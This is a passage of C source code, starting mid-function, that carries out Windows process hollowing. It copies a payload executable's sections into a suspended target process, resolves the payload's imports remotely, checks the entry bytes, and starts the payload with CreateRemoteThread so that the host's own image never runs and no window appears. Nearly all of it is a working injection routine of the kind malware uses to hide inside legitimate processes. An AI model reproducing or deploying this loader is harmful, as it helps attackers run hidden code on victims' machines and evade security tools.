        for (i = 0; i < nt->FileHeader.NumberOfSections; i++, sec++) {
            DWORD vsize = sec->Misc.VirtualSize;
            if (!vsize) continue;
            wpm(pi.hProcess, mapped + sec->VirtualAddress,
                tmp + sec->VirtualAddress, vsize);
        }
        free(tmp);
    }

    /* --- resolve imports inside the target --------------------------------- */
    {
        int n = resolve_imports_remote_p(pi.hProcess, peb, payload,
                                          (ULONGLONG)(ULONG_PTR)mapped, nt);
        plog("[hollow] resolved %d import(s) in the target\n", n);
        if (n <= 0) {
            plog("[hollow] import resolution failed; aborting\n");
            return 9;
        }
    }

    /* --- verify what actually landed in the target ------------------------ */
    {
        MEMORY_BASIC_INFORMATION mbi;
        ULONGLONG entryAddr = targetBase + nt->OptionalHeader.AddressOfEntryPoint;
        BYTE back[16];
        ULONGLONG iatWord = 0;

        memset(back, 0, sizeof(back));
        if (rpm(pi.hProcess, (void *)(ULONG_PTR)entryAddr, back, sizeof(back)))
            plog("[hollow] verify: entry bytes =");
        else
            plog("[hollow] verify: entry bytes unreadable\n");
        for (size_t bi = 0; bi < sizeof(back); bi++)
            plog(" %02x", back[bi]);
        plog("\n");
        plog("[hollow] verify: local entry bytes =");
        {
            DWORD raw = rva_to_raw(nt, nt->OptionalHeader.AddressOfEntryPoint);
            for (size_t bi = 0; bi < sizeof(back); bi++)
                plog(" %02x", payload[raw + bi]);
        }
        plog("\n");

        if (VirtualQueryEx(pi.hProcess, (LPCVOID)(ULONG_PTR)entryAddr, &mbi,
                           sizeof(mbi))) {
            plog("[hollow] verify: entry page protect=0x%lx state=0x%lx "
                 "type=0x%lx\n", (unsigned long)mbi.Protect,
                 (unsigned long)mbi.State, (unsigned long)mbi.Type);
        }

        {
            DWORD iatRva = 0;
            IMAGE_DATA_DIRECTORY *impDd =
                &nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
            IMAGE_IMPORT_DESCRIPTOR *d2 =
                (IMAGE_IMPORT_DESCRIPTOR *)(payload +
                                             rva_to_raw(nt, impDd->VirtualAddress));
            if (d2->FirstThunk) {
                iatRva = d2->FirstThunk;
                if (rpm(pi.hProcess,
                        (void *)(ULONG_PTR)(targetBase + iatRva), &iatWord,
                        sizeof(iatWord)))
                    plog("[hollow] verify: first IAT slot = 0x%llx\n",
                         iatWord);
            }
        }
    }

    /* --- run the payload on a fresh thread in the target ------------------- */
    /*
     * CreateRemoteThread rather than hijacking the initial thread.
     *
     * Hijacking means taking over a thread that the loader left suspended
     * somewhere in its own initialisation: its stack holds loader frames and
     * RSP is not aligned the way a function entry expects. Resuming it at a
     * foreign entry point is fragile -- the payload's prologue assumes a
     * conventional calling convention that the inherited stack does not
     * provide.
     *
     * A remote thread gets a fresh stack, a fresh register set and a
     * correct context from the OS. It also means the initial thread never
     * has to run at all, so the target's original image is never entered
     * and no window ever appears.
     */
    {
        ULONGLONG entryAddr = targetBase + nt->OptionalHeader.AddressOfEntryPoint;
        HANDLE rth = CreateRemoteThread(pi.hProcess, NULL, 0,
                                         (LPVOID)(ULONG_PTR)entryAddr,
                                         NULL, 0, NULL);
        if (!rth) {
            plog("[hollow] CreateRemoteThread failed (%lu)\n",
                 (unsigned long)GetLastError());
            return 11;
        }
        plog("[hollow] remote thread created at 0x%llx; the payload now runs "
             "as pid %lu\n", (unsigned long long)entryAddr,
             (unsigned long)pi.dwProcessId);
        CloseHandle(rth);
    }


    /* keep the handles open so the child survives us */
    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    free(payload);
    return 0;
}
